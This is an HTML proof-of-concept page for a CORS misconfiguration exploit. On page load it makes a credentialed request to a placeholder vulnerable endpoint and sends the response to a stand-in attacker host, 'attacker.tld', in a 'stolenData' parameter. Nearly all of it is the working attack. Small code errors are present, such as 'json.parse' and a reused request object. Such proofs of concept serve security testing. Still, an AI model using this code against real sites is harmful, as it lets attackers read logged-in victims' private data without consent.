<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CORS Exploit POC</title>
  </head>
  
  <body onload="CORSExploit()">
    <script>
      const CORSExploit = () => {
      	let xhr = new XMLHttpRequest();

      	xhr.onreadystatechange = function() {
      		if(xhr.readyState == 4 && xhr.status == 200) {

      			let data = json.parse(xhr.responseText);

      			// sendig the data to our own server or collaborator
      			xhr.open('GET', `https://attacker.tld/?stolenData=${data}`);
      			xhr.send();
      		}
      	}

        // Endpoint returning JSON data
        // Only works on endpoints protected by Cookies
        const vulnerableEndpoint = 'http://vulnerableWebsite.tld/sensitiveData';
        
        xhr.open("GET", vulnerableEndpoint);
        xhr.withCredentials = true;
        xhr.send();
      }
    </script>
  </body>
</html>
